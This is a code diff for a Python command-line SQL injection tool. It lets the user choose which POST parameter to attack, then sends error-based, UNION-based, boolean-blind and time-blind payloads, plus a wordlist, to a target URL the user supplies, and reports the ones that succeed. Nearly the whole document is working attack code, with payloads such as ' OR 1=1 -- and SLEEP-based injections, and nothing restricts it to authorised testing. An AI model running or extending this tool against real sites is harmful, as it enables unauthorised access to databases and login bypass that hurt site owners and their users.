@@ -33,12 +33,44 @@ def load_payloads(filename):
         print(Fore.RED + f"[-] Payload file {filename} not found.")
         return []
 
+
+def input_Params():
+    # Get the number of parameters from the user
+    num = input(Fore.BLUE + "How many parameters do you have: ")
+    pars = []
+    data_template = {}
+
+    # Collect parameter names and values
+    for i in range(int(num)):
+        par = input(Fore.WHITE + f"Enter the name of Parameter {i + 1}: ")
+        pars.append(par)
+        data_template[par] = "test"  # Initialize all parameters with "test"
+
+    # Display the collected parameters
+    for i in range(int(num)):
+        print(i + 1, pars[i])
+
+    # Get the target parameter number from the user
+    target_index = int(input(Fore.BLUE + "Enter the number of the target parameter: ")) - 1
+
+    # Return the parameter names and the template dictionary
+    return pars, data_template, target_index
+
+
+def update_payload(data_template, target_param, new_payload):
+    # Create a new dictionary based on the template
+    updated_data = data_template.copy()
+    updated_data[target_param] = new_payload  # Update the target parameter with the new payload
+    return updated_data
+
+
 # Error-based SQL Injection Check
-def is_vulnerable_to_sql_injection(base_url):
+def is_vulnerable_to_sql_injection(base_url, data_template, target_param):
     print(Fore.BLUE + "[*] Checking if the website is vulnerable to SQL Injection (Error-based)...")
     test_payload = "' OR 1=1 --"
     login_url = f'{base_url}'
-    data = {"email": test_payload, "password": "test"}
+    data = update_payload(data_template, target_param, test_payload)
+    print(data)
 
     # Common error patterns for different databases
     error_based_patterns = [
@@ -67,11 +99,11 @@ def is_vulnerable_to_sql_injection(base_url):
         return False
 
 # Perform Union-based SQL Injection
-def union_based_injection(base_url):
+def union_based_injection(base_url,data_template,target_param):
     print(Fore.BLUE + "[*] Attempting UNION-based SQL Injection...")
     for i in range(1, 10):  # Test up to 10 columns
         payload = f"' UNION SELECT " + ", ".join(["NULL"] * i) + " -- "
-        data = {"email": payload, "password": "test"}
+        data = update_payload(data_template, target_param, payload)
         response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
         if response.status_code == 200 and "NULL" not in response.text:
             print(Fore.GREEN +f"[+] UNION-based SQL Injection Successful with {i} columns!")
@@ -80,15 +112,17 @@ def union_based_injection(base_url):
             #print(Fore.RED + f"[-] UNION-based SQL Injection Failed with {i} columns.")
 
 # Perform Boolean-based Blind SQL Injection
-def boolean_based_blind_sql_injection(base_url):
+def boolean_based_blind_sql_injection(base_url,data_template,target_param):
     print(Fore.BLUE + "[*] Attempting Boolean-based Blind SQL Injection...")
     true_payload = "' AND 1=1 -- "
     false_payload = "' AND 1=2 -- "
 
     # Testing with True condition
-    true_response = requests.post(base_url, json={"email": true_payload, "password": "test"}, headers=headers, allow_redirects=False)
+    data = update_payload(data_template, target_param, true_payload)
+    true_response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
     # Testing with False condition
-    false_response = requests.post(base_url, json={"email": false_payload, "password": "test"}, headers=headers, allow_redirects=False)
+    data = update_payload(data_template, target_param, false_payload)
+    false_response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
 
     if true_response.status_code == 200 and false_response.status_code != 200:
         print(Fore.GREEN +"[+] Boolean-based Blind SQL Injection Successful!")
@@ -96,12 +130,13 @@ def boolean_based_blind_sql_injection(base_url):
         print(Fore.RED + "[-] Boolean-based Blind SQL Injection Failed.")
 
 # Perform Time-based Blind SQL Injection
-def time_based_blind_sql_injection(base_url):
+def time_based_blind_sql_injection(base_url,data_template,target_param):
     print(Fore.BLUE + "[*] Attempting Time-based Blind SQL Injection...")
     sleep_payload = "'; IF(1=1, SLEEP(5), SLEEP(0)) -- "
     start_time = time()
 
-    response = requests.post(base_url, json={"email": sleep_payload, "password": "test"}, headers=headers, allow_redirects=False)
+    data = update_payload(data_template, target_param, sleep_payload)
+    response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
     end_time = time()
 
     if end_time - start_time > 5:
@@ -110,39 +145,41 @@ def time_based_blind_sql_injection(base_url):
         print(Fore.RED + "[-] Time-based Blind SQL Injection Failed.")
 
 # SQL Injection Attack Automation
-def sql_injection_attack(base_url):
+def sql_injection_attack(base_url,data_template, target_param):
     # Load SQL injection payloads from file
     sql_payloads = input(Fore.BLUE + "Enter the target payloads word list path: ")
     payloads = load_payloads(sql_payloads)
 
     print(Fore.BLUE + "[*] Attempting SQL Injection with various payloads...")
     for payload in payloads:
-        data = {"email": payload, "password": "test"}
+        data = update_payload(data_template, target_param, payload)
+        #print(data)
         response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
         if response.status_code == 200 and "authentication" in response.text:
             print(Fore.GREEN +f"[+] SQL Injection Successful with payload: {payload}")
         #else:
-            #print(Fore.RED + f"[-] SQL Injection Failed with payload: {payload}")
-            
+        #    print(Fore.RED + f"[-] SQL Injection Failed with payload: {payload}")
+
 
 # Main function to run all types of attacks
 def main():
     display_banner()
     base_url = input(Fore.BLUE + "Enter the target URL: ")
-    
+    parameter_names, data_template, target_index = input_Params()
+    target_param_name = parameter_names[target_index]
     # Error-based SQL injection
-    if is_vulnerable_to_sql_injection(base_url):
+    if is_vulnerable_to_sql_injection(base_url, data_template, target_param_name):
         # Perform UNION-based SQL Injection
-        union_based_injection(base_url)
+        union_based_injection(base_url, data_template, target_param_name)
 
         # Perform Boolean-based Blind SQL Injection
-        boolean_based_blind_sql_injection(base_url)
+        boolean_based_blind_sql_injection(base_url, data_template, target_param_name)
 
         # Perform Time-based Blind SQL Injection
-        time_based_blind_sql_injection(base_url)
+        time_based_blind_sql_injection(base_url, data_template, target_param_name)
 
         # Perform SQL Injection with different payloads
-        sql_injection_attack(base_url)
+        sql_injection_attack(base_url, data_template, target_param_name)
 
 if __name__ == '__main__':
     main()
